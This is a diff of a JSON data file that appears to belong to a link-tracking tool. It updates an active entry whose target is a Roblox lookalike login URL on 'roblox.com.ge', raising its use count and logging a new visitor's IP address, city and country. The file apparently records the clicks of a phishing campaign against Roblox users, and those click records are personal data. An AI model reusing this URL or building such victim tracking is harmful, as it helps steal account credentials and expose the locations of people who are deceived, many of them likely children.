@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 820,
+    "useCount": 821,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6672,6 +6672,14 @@
         "city": "Santo Domingo",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777172674195,
+        "ip": "74.254.4.60",
+        "country": "United States",
+        "city": "Denver",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
